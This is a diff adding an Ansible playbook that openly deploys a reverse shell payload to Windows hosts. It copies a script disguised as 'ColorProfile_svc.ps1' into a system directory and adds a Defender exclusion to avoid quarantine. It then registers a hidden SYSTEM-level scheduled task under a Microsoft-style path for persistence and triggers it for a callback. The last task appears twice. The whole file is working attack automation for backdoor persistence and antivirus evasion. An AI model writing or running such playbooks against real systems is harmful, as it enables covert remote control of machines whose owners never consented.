@@ -1,0 +1,54 @@
+---
+- name: Deploy reverse shell payload to Windows target
+  hosts: windows
+  gather_facts: false
+
+  vars:
+    payload_dir: 'C:\Windows\System32\spool\drivers\color'
+
+  tasks:
+
+    - name: Ensure payload directory exists
+      ansible.windows.win_file:
+        path: "{{ payload_dir }}"
+        state: directory
+
+    - name: Copy reverse shell payload to target
+      ansible.windows.win_copy:
+        src: ColorProfile_svc.ps1
+        dest: "{{ payload_dir }}\\ColorProfile_svc.ps1"
+
+    - name: Add Defender exclusion so payload is not quarantined
+      ansible.windows.win_shell: |
+        Add-MpPreference -ExclusionPath "{{ payload_dir }}"
+      ignore_errors: true
+
+    - name: Register payload as a hidden scheduled task
+      ansible.windows.win_shell: |
+        $action = New-ScheduledTaskAction `
+          -Execute "powershell.exe" `
+          -Argument "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File 'C:\Windows\System32\spool\drivers\color\ColorProfile_svc.ps1'"
+
+        $trigger = New-ScheduledTaskTrigger -AtStartup
+
+        $settings = New-ScheduledTaskSettingsSet `
+          -RestartCount 300 `
+          -RestartInterval (New-TimeSpan -Minutes 1)
+
+        Register-ScheduledTask `
+          -TaskName "ColorProfileUpdater" `
+          -TaskPath "\Microsoft\Windows\WindowsColorSystem\" `
+          -Action $action `
+          -Trigger $trigger `
+          -Settings $settings `
+          -RunLevel Highest `
+          -User "SYSTEM" `
+          -Force
+
+    - name: Trigger task immediately for first callback
+      ansible.windows.win_shell: |
+        Start-ScheduledTask -TaskPath "\Microsoft\Windows\WindowsColorSystem\" -TaskName "ColorProfileUpdater"
+
+    - name: Trigger task immediately for first callback
+      ansible.windows.win_shell: |
+        Start-ScheduledTask -TaskPath "\Microsoft\Windows\WindowsColorSystem\" -TaskName "ColorProfileUpdater"
